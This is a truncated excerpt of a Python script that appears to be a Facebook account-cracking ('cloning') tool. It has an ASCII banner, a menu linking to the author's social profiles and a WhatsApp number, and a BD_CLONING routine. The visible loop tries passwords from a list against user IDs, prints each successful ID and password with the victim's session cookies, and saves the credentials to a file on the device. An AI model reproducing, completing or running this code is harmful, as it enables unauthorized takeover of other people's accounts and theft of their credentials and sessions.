...
os.system('xdg-open https://www.facebook.com/mdhimel.himel.526875')
#-------------color----------------#
...
888    888          8888b   888 
888    888          88888b  888 
8888888888 888  888 888Y88b 888 
888    888 `Y8bd8P' 888 Y88b888 
888    888   X88K   888  Y88888 
888    888 .d8""8b. 888   Y8888 
...
def TARA_LOVE():
    clear()
    os.system('xdg-open https://github.com/Hime-888')
    ...
    if option in ['01','1']:
        BD_CLONING()
    if option in ['02','2']:
    	os.system('xdg-open https://www.facebook.com/mdhimel.himel.526875');time.sleep(1)
    if option in ['03','3']:
    	os.system('xdg-open https://wa.me/+8801615731455');time.sleep(1)
    else:
        ...
        for pas in passlist:
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[HxN-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;37m [COOKIE-🌸] '+coki)
                    open('/sdcard/HxN-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
